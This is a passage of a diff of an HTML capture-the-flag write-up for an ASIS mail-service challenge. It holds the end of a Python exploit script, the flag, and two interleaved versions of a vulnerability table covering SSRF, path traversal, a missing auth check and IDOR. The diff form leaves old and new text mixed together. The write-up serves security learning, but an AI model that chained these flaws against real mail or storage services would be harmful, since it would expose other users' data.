-</span><span id="__span-17-54"><a id="__codelineno-17-54" name="__codelineno-17-54" href="#__codelineno-17-54"></a>                <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}{</span><span class="n">att_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-17-55"><a id="__codelineno-17-55" name="__codelineno-17-55" href="#__codelineno-17-55"></a>                <span class="k">if</span> <span class="s2">&quot;ASIS{&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-</span><span id="__span-17-56"><a id="__codelineno-17-56" name="__codelineno-17-56" href="#__codelineno-17-56"></a>                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">*** FLAG: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2"> ***&quot;</span><span class="p">)</span>
-</span><span id="__span-17-57"><a id="__codelineno-17-57" name="__codelineno-17-57" href="#__codelineno-17-57"></a>                    <span class="k">return</span>
-</span><span id="__span-17-58"><a id="__codelineno-17-58" name="__codelineno-17-58" href="#__codelineno-17-58"></a>
-</span><span id="__span-17-59"><a id="__codelineno-17-59" name="__codelineno-17-59" href="#__codelineno-17-59"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-</span><span id="__span-17-60"><a id="__codelineno-17-60" name="__codelineno-17-60" href="#__codelineno-17-60"></a>    <span class="n">main</span><span class="p">()</span>
-</span></code></pre></div>
-<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
-</span></code></pre></div>
-<h2 id="vulnerabilities-summary">Vulnerabilities Summary<a class="headerlink" href="#vulnerabilities-summary" title="Permanent link">&para;</a></h2>
+<p>Microservices architecture introduces complexity, and with complexity comes opportunities for security gaps between service boundaries. Each service was somewhat secure on its own, but the interactions between them created vulnerabilities.</p>
 <table>
 <thead>
 <tr>
 <th>Vulnerability</th>
-<th>Location</th>
 <th>Impact</th>
+<th>Used For</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>SSRF</td>
-<td>API <code>/compose</code> endpoint</td>
-<td>Access internal services</td>
+<td>Internal service access</td>
+<td>Fetch the flag file</td>
 </tr>
 <tr>
 <td>Path Traversal</td>
-<td>Objectstore <code>/public/&lt;bucket&gt;/&lt;path&gt;</code></td>
-<td>Read arbitrary files</td>
-</tr>
-<tr>
-<td>Missing Auth Check</td>
-<td>Objectstore <code>/public/.../hash</code></td>
-<td>Verify file existence</td>
+<td>Directory escape</td>
+<td>Access FLAG bucket</td>
 </tr>
 <tr>
 <td>IDOR</td>
-<td>API <code>/mail/&lt;id&gt;</code></td>
-<td>Read any user's emails</td>
+<td>Information disclosure</td>
+<td>Find flag filename</td>
 </tr>
 </tbody>
 </table>
-<h2 id="lessons-learned">Lessons Learned<a class="headerlink" href="#lessons-learned" title="Permanent link">&para;</a></h2>
-<ol>
-<li><strong>Defense in Depth</strong>: Multiple checks at different layers would have prevented this attack</li>
-<li><strong>Path Sanitization</strong>: Always sanitize user input that becomes part of file paths</li>
-<li><strong>Consistent Security Checks</strong>: The hash endpoint missing the FLAG check was a critical oversight</li>
-<li><strong>SSRF Prevention</strong>: Whitelist allowed URLs/protocols for server-side requests</li>
-</ol>
-<h2 id="tools-used">Tools Used<a class="headerlink" href="#tools-used" title="Permanent link">&para;</a></h2>
-<ul>
-<li>Python requests library</li>
-<li>Manual code review of source files</li>
-<li>Analysis of other users' attempts via IDOR vulnerability</li>
-</ul>
+<p>The IDOR vulnerability turned out to be critical - without it, I would have had to brute-force or guess the MD5 hash in the filename, which would have been practically impossible.</p>
 
 
 
